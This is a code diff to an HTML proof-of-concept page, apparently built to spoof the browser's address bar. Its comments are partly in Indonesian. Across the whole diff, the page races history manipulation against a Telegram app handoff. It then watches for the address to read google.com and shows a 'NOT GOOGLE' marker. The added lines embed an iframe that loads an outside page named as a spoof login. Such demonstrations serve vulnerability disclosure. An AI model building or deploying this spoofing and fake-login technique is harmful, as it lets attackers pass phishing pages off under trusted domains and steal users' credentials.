@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="utf-8">
-<title>PoC</title>
+<title>Strong PoC</title>
 <meta name="viewport" content="width=device-width, initial-scale=1">
 
 <style>
@@ -31,11 +31,23 @@ button {
   text-align: center;
 }
 
+#iframeWrap {
+  display: none;
+  margin-top: 20px;
+}
+
+#iframeWrap iframe {
+  width: 100%;
+  height: 180px;
+  border: 1px solid #ddd;
+  border-radius: 8px;
+}
+
 #spoof {
   display: none;
   margin-top: 20px;
   font-size: 28px;
-  font-weight: 600;
+  font-weight: 700;
   color: #b00020;
 }
 </style>
@@ -45,28 +57,43 @@ button {
 
 <div id="panel">
   <button onclick="start()">Start</button>
+
+  <div id="iframeWrap">
+    <iframe src="https://cnfdnfial-ops.github.io/spoof/login.html"></iframe>
+  </div>
+
   <div id="spoof">NOT GOOGLE</div>
 </div>
 
 <script>
 const spoof = document.getElementById('spoof');
+const iframeWrap = document.getElementById('iframeWrap');
 
+function showSpoofOnce() {
+  if (spoof.style.display !== 'block') {
+    spoof.style.display = 'block';
+  }
+}
+
+/* Mulai PoC */
 function start() {
-  /* history manipulation */
   history.pushState({}, '', '/trusted');
 
-  /* open Telegram */
+  /* iframe muncul 2 detik setelah klik */
+  setTimeout(() => {
+    iframeWrap.style.display = 'block';
+  }, 2000);
+
+  /* App handoff */
   setTimeout(() => {
     location.href = 'tg://resolve?domain=telegram';
   }, 200);
 
-  /* tampilkan NOT GOOGLE setelah 3 detik */
-  setTimeout(() => {
-    spoof.style.display = 'block';
-  }, 1900);
+  /* Guard fallback */
+  setTimeout(showSpoofOnce, 3000);
 }
 
-/* navigation race */
+/* Navigation race */
 window.addEventListener('pageshow', () => {
   requestAnimationFrame(() => {
     requestAnimationFrame(() => {
@@ -75,6 +102,32 @@ window.addEventListener('pageshow', () => {
       }, 80);
     });
   });
+});
+
+/* KUAT: trigger berdasarkan URL */
+(function watchURL() {
+  const MAX_MS = 120000;
+  const t0 = Date.now();
+
+  const iv = setInterval(() => {
+    try {
+      if (location.href.startsWith('https://google.com')) {
+        showSpoofOnce();
+        clearInterval(iv);
+      }
+      if (Date.now() - t0 > MAX_MS) {
+        clearInterval(iv);
+      }
+    } catch (e) {}
+  }, 50);
+})();
+
+/* Stabil saat balik dari app */
+document.addEventListener('visibilitychange', () => {
+  if (document.visibilityState === 'visible' &&
+      location.href.startsWith('https://google.com')) {
+    showSpoofOnce();
+  }
 });
 </script>
 
